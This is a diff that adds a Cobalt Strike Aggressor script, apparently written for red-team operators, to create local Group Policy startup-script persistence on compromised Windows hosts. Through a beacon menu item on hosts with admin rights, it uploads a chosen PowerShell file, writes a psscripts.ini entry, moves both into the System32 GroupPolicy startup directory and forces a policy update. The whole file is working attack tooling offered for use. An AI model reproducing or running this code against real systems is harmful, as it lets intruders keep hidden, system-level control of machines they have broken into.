@@ -1,0 +1,50 @@
+#Startup Script Local GPO Persistence
+#Author: @r3dQu1nn
+#Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon 
+#**Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**
+#https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/
+
+sub persistStartupGPO  {
+
+	$bid = $1;
+	$dialog = dialog("Startup Script Local GPO Persistence", %(scriptfile => "Select PS1 Script File.."), lambda({
+		if ("$3['scriptfile']" ismatch 'Select PS1 Script File..') {
+			berror($bid, "\c4Please enter a valid Script Path, and .ps1 Script File.");
+			break;
+		}
+		else {
+			bcd($bid, "C:\\");
+			bupload($bid, $3['scriptfile']);
+			$handle = openf(">psscripts.ini");
+			writeb($handle, "[ScriptsConfig]\nStartExecutePSFirst=true\n[Startup]\n0CmdLine=".split("/",$3['scriptfile'])[-1]."\n0Parameters=");
+			closef($handle);
+			bpowershell($bid, 'Move-Item -force -path C:\\'.split("/",$3['scriptfile'])[-1].' -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\');
+			bupload($bid, script_resource("psscripts.ini"));
+			bpowershell($bid, 'Remove-Item -Force C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini');
+			bpowershell($bid, 'Move-Item -force -path C:\\psscripts.ini -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\');
+			bshell($bid, 'gpupdate /force');
+		}
+	}));
+
+	dialog_description($dialog, "Startup Script Local GPO Persistence - Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon. **Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**");
+	
+	drow_file($dialog, "scriptfile", ".ps1 Script File:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	item "Startup Script Local GPO Persistence" {
+		local ('$bid');
+		foreach $bid ($1) {
+			if (-isadmin $bid) {
+				persistStartupGPO($bid);
+			}
+			else {
+				berror($1, "\c4Persistence Requires Admin Level Privileges");
+			}
+		}
+	}
+} 
